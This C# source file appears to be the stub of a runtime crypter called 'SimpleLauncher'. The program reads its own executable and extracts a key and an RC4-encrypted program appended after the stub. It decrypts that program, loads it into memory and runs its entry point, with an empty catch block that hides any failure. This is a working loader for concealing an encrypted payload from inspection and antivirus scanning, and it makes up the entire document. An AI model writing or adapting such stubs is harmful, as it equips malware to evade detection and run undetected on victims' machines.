using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Reflection;

namespace SimpleLauncher
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
            {
                // Opens the executing assembly in read only mode
                string selfFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", "");
                FileStream self = new FileStream(selfFileName, FileMode.Open, FileAccess.Read);
                BinaryReader selfReader = new BinaryReader(self);

                // Reads the last 4 bytes containing the length of the stub 
                selfReader.ReadBytes((int)self.Length - 4);
                int selfSize = selfReader.ReadInt32();

                // Sets the position at the end of the stub 
                selfReader.BaseStream.Seek(selfSize, SeekOrigin.Begin);

                // Reads the Key, the Length and the Cryptogram 
                string str_key = selfReader.ReadString();
                byte[] key = System.Text.Encoding.ASCII.GetBytes(str_key);
                int length = selfReader.ReadInt32();
                byte[] cryptogram = selfReader.ReadBytes(length);

                // Decrypts the program 
                byte[] program = RC4.Decrypt(key, cryptogram);

                // Loads the program and invokes it's entry point
                Assembly.Load(program).EntryPoint.Invoke(null, null);
            }
            catch {  }
        }
    }
}
